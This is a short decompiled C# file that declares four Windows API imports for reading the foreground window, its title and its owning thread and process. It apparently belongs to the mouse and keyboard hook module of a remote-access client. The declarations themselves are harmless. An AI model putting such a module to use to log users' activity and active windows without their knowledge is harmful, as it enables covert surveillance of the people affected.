using System;
using System.Runtime.InteropServices;
using System.Text;

namespace xClient.Core.MouseKeyHook.WinApi
{
	// Token: 0x02000080 RID: 128
	internal static class ThreadNativeMethods
	{
		// Token: 0x06000341 RID: 833
		[DllImport("kernel32.dll")]
		internal static extern int GetCurrentThreadId();

		// Token: 0x06000342 RID: 834
		[DllImport("user32.dll")]
		internal static extern IntPtr GetForegroundWindow();

		// Token: 0x06000343 RID: 835
		[DllImport("user32.dll", CharSet = CharSet.Unicode, SetLastError = true)]
		internal static extern int GetWindowText(IntPtr hWnd, StringBuilder lpString, int nMaxCount);

		// Token: 0x06000344 RID: 836
		[DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
		internal static extern int GetWindowThreadProcessId(IntPtr handle, out int processId);
	}
}
